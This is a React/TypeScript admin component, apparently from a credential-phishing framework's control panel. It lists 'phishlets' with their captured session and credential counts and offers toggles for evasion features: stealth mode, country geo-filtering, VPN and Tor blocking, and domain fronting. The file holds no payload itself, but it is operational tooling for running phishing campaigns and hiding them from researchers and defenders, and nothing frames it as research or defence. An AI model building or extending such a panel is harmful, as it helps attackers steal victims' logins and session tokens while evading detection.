import React, { useState, useEffect } from 'react';

interface Phishlet {
  name: string;
  hostname: string;
  enabled: boolean;
  sessions: number;
  credentials: number;
  lastUsed: string;
  evasionConfig: {
    enableStealth: boolean;
    geoFiltering: boolean;
    allowedCountries: string[];
    blockVPN: boolean;
    blockTor: boolean;
    domainFronting: boolean;
  };
}

const PhishletManager: React.FC = () => {
  const [phishlets, setPhishlets] = useState<Phishlet[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedPhishlet, setSelectedPhishlet] = useState<Phishlet | null>(null);
  const [showConfig, setShowConfig] = useState(false);

  useEffect(() => {
    const fetchPhishlets = async () => {
      try {
        setLoading(true);
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:8080';
        const response = await fetch(`${apiUrl}/api/phishlets`);
        
        if (response.ok) {
          const data = await response.json();
          setPhishlets(data);
        } else {
          setError('Failed to fetch phishlets');
        }
      } catch (err) {
        setError('Failed to fetch phishlets');
        console.error('Phishlets fetch error:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchPhishlets();
  }, []);

  const togglePhishlet = async (name: string, enabled: boolean) => {
    try {
      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:8080';
      const response = await fetch(`${apiUrl}/api/phishlets/${name}/toggle`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: !enabled })
      });

      if (response.ok) {
        setPhishlets(prev => prev.map(p => 
          p.name === name ? { ...p, enabled: !enabled } : p
        ));
      }
    } catch (err) {
      console.error('Toggle phishlet error:', err);
    }
  };

  const updateEvasionConfig = async (name: string, config: Phishlet['evasionConfig']) => {
    try {
      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:8080';
      const response = await fetch(`${apiUrl}/api/phishlets/${name}/evasion`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      });

      if (response.ok) {
        setPhishlets(prev => prev.map(p => 
          p.name === name ? { ...p, evasionConfig: config } : p
        ));
        setShowConfig(false);
        setSelectedPhishlet(null);
      }
    } catch (err) {
      console.error('Update evasion config error:', err);
    }
  };

  if (loading) {
    return <div className="loading">Loading phishlets...</div>;
  }

  if (error) {
    return <div className="error">{error}</div>;
  }

  return (
    <div className="phishlet-manager">
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Phishlet Management</h2>
          <button className="btn btn-primary">Add New Phishlet</button>
        </div>
        
        {phishlets.length === 0 ? (
          <p>No phishlets configured.</p>
        ) : (
          <table className="table">
            <thead>
              <tr>
                <th>Name</th>
                <th>Hostname</th>
                <th>Status</th>
                <th>Sessions</th>
                <th>Credentials</th>
                <th>Last Used</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {phishlets.map(phishlet => (
                <tr key={phishlet.name}>
                  <td>{phishlet.name}</td>
                  <td>{phishlet.hostname}</td>
                  <td>
                    <span className={`status-badge ${phishlet.enabled ? 'status-active' : 'status-inactive'}`}>
                      {phishlet.enabled ? 'Enabled' : 'Disabled'}
                    </span>
                  </td>
                  <td>{phishlet.sessions}</td>
                  <td>{phishlet.credentials}</td>
                  <td>{phishlet.lastUsed ? new Date(phishlet.lastUsed).toLocaleDateString() : 'Never'}</td>
                  <td>
                    <button
                      className={`btn ${phishlet.enabled ? 'btn-danger' : 'btn-success'}`}
                      onClick={() => togglePhishlet(phishlet.name, phishlet.enabled)}
                    >
                      {phishlet.enabled ? 'Disable' : 'Enable'}
                    </button>
                    <button
                      className="btn btn-secondary"
                      onClick={() => {
                        setSelectedPhishlet(phishlet);
                        setShowConfig(true);
                      }}
                      style={{ marginLeft: '0.5rem' }}
                    >
                      Configure
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {showConfig && selectedPhishlet && (
        <div className="modal-overlay">
          <div className="modal">
            <div className="modal-header">
              <h3>Evasion Configuration - {selectedPhishlet.name}</h3>
              <button 
                className="modal-close"
                onClick={() => {
                  setShowConfig(false);
                  setSelectedPhishlet(null);
                }}
              >
                ×
              </button>
            </div>
            
            <div className="modal-body">
              <div className="form-group">
                <label className="form-label">
                  <input
                    type="checkbox"
                    checked={selectedPhishlet.evasionConfig.enableStealth}
                    onChange={(e) => setSelectedPhishlet({
                      ...selectedPhishlet,
                      evasionConfig: {
                        ...selectedPhishlet.evasionConfig,
                        enableStealth: e.target.checked
                      }
                    })}
                  />
                  Enable Stealth Mode
                </label>
              </div>

              <div className="form-group">
                <label className="form-label">
                  <input
                    type="checkbox"
                    checked={selectedPhishlet.evasionConfig.geoFiltering}
                    onChange={(e) => setSelectedPhishlet({
                      ...selectedPhishlet,
                      evasionConfig: {
                        ...selectedPhishlet.evasionConfig,
                        geoFiltering: e.target.checked
                      }
                    })}
                  />
                  Enable Geo-filtering
                </label>
              </div>

              <div className="form-group">
                <label className="form-label">Allowed Countries (comma-separated)</label>
                <input
                  type="text"
                  className="form-control"
                  value={selectedPhishlet.evasionConfig.allowedCountries.join(', ')}
                  onChange={(e) => setSelectedPhishlet({
                    ...selectedPhishlet,
                    evasionConfig: {
                      ...selectedPhishlet.evasionConfig,
                      allowedCountries: e.target.value.split(',').map(c => c.trim()).filter(c => c)
                    }
                  })}
                  placeholder="US, GB, CA"
                />
              </div>

              <div className="form-group">
                <label className="form-label">
                  <input
                    type="checkbox"
                    checked={selectedPhishlet.evasionConfig.blockVPN}
                    onChange={(e) => setSelectedPhishlet({
                      ...selectedPhishlet,
                      evasionConfig: {
                        ...selectedPhishlet.evasionConfig,
                        blockVPN: e.target.checked
                      }
                    })}
                  />
                  Block VPN Traffic
                </label>
              </div>

              <div className="form-group">
                <label className="form-label">
                  <input
                    type="checkbox"
                    checked={selectedPhishlet.evasionConfig.blockTor}
                    onChange={(e) => setSelectedPhishlet({
                      ...selectedPhishlet,
                      evasionConfig: {
                        ...selectedPhishlet.evasionConfig,
                        blockTor: e.target.checked
                      }
                    })}
                  />
                  Block Tor Traffic
                </label>
              </div>

              <div className="form-group">
                <label className="form-label">
                  <input
                    type="checkbox"
                    checked={selectedPhishlet.evasionConfig.domainFronting}
                    onChange={(e) => setSelectedPhishlet({
                      ...selectedPhishlet,
                      evasionConfig: {
                        ...selectedPhishlet.evasionConfig,
                        domainFronting: e.target.checked
                      }
                    })}
                  />
                  Enable Domain Fronting
                </label>
              </div>
            </div>

            <div className="modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => {
                  setShowConfig(false);
                  setSelectedPhishlet(null);
                }}
              >
                Cancel
              </button>
              <button
                className="btn btn-primary"
                onClick={() => updateEvasionConfig(selectedPhishlet.name, selectedPhishlet.evasionConfig)}
              >
                Save Configuration
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default PhishletManager;
